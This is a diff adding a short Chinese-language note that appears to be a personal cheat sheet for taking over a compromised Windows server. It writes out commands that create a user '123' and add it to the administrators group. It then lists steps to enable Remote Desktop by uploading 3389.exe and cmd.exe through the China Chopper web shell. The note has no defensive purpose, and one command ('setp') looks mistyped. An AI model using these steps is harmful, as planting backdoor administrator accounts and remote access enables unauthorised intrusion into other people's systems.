@@ -1,0 +1,8 @@
+增加用户:net user 123 123 /add
+提权 net localgroup administrators 123/add
+  (1)远程连接:mstsc
+  (2)远程连接没开启时,开启远程连接菜刀里放 3389.exe
+  (3)终端里运行3389.exe
+  (4)重复1
+  (5)终端权限不足,cmd也无法执行,直接放 cmd.exe
+  (6)执行 setp cmd.exe 重复1
